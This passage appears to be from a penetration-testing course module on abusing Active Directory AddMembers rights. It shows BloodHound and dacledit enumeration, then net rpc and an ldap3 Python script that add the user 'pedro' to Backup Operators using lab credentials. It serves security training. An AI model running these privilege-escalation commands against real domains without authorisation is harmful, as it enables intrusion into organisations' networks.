
---
---
When an attacker controls a privileged user account with the ability to edit a group's member attribute, they can effectively add new users to that group. This attack/abuse is possible when the controlled account has `GenericAll`, `GenericWrite`, `Self`, `AllExtendedRights`, or `Self-Membership` over the target group.
## Identifying Vulnerable Groups

We can use `BloodHound` to determine if we have those privileges via the [AddMembers](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#addmembers) edge:

![addmember_bloodhound.png](https://academy.hackthebox.com/storage/modules/219/addmember_bloodhound.png)

```bash
python3 examples/dacledit.py -principal pedro -target 'Backup Operators' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
## Abusing AddMember From Linux

> Using net to Query Group Membership

```shell
net rpc group members 'Backup Operators' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```

> Using net to Add Pedro to Backup Operators

```bash
net rpc group addmem 'Backup Operators' pedro -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```

We got access denied because `net` doesn't allow us to abuse group membership with `Self-Membership` rights. For such cases, an alternative is to use the LDAP protocol when we are trying to change a group's membership. Let us create a Python script to modify the group membership using LDAP. For this example, we will use the [addusertogroup](https://github.com/juliourena/ActiveDirectoryScripts/blob/main/Python/addusertogroup.py) Python script that utilizes the [ldap3 library](https://ldap3.readthedocs.io/en/latest/):

> Using LDAP for Adding a User to a Group

```bash
python3 addusertogroup.py -d inlanefreight.local -g "Backup Operators" -a pedro -u pedro -p SecuringAD01
```

> Query Group Membership

```bash
 net rpc group members 'Backup Operators' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```

